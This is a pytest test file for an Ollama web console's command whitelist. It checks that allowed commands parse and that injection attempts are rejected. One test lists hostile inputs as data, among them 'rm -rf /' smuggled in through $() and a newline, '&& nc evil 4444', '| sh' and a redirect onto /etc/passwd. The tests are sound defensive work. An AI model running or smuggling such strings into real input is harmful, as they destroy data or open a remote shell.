"""Tests for the Ollama Console command whitelist."""
import pytest

from webui.ollama_console import (
    ALLOWED_COMMANDS,
    ConsoleError,
    OllamaConsole,
    parse_command,
    validate_model_name,
)


def test_parse_allowed_commands():
    for cmd in ("list", "ps", "show", "pull", "push", "create", "cp", "rm", "stop", "version"):
        assert cmd in ALLOWED_COMMANDS


def test_parse_valid():
    assert parse_command("ollama pull qwen3:8b") == ("pull", ["qwen3:8b"])
    assert parse_command("ollama cp a:b c:d") == ("cp", ["a:b", "c:d"])
    assert parse_command("list") == ("list", [])
    assert parse_command("ollama show qwen3:8b") == ("show", ["qwen3:8b"])


def test_parse_rejects_unknown_command():
    with pytest.raises(ConsoleError):
        parse_command("ollama run bash")


def test_parse_rejects_shell_metachars():
    for bad in (
        "ollama rm $(rm -rf /)",
        "ollama pull x; id",
        "ollama pull `touch /tmp/x`",
        "ollama pull 'qwen3' && nc evil 4444",
        "ollama push x | sh",
        "ollama show x > /etc/passwd",
        "ollama rm a\nrm -rf /",
    ):
        with pytest.raises(ConsoleError):
            parse_command(bad)


def test_validate_model_name():
    assert validate_model_name("qwen3:8b") == "qwen3:8b"
    assert validate_model_name("user/model:tag") == "user/model:tag"
    with pytest.raises(ConsoleError):
        validate_model_name("a;b")
    with pytest.raises(ConsoleError):
        validate_model_name("")


@pytest.mark.asyncio
async def test_console_version_and_list(mock_ollama):
    console = OllamaConsole(mock_ollama)
    r = await console.run("ollama version")
    assert r.exit_code == 0
    assert r.output == "0.32.6"
    r2 = await console.run("ollama list")
    assert r2.exit_code == 0
    assert "qwen3:8b" in r2.output


@pytest.mark.asyncio
async def test_console_blocks_bad_command(mock_ollama):
    console = OllamaConsole(mock_ollama)
    r = await console.run("ollama rm -rf /")
    assert r.exit_code == 2
    assert r.error
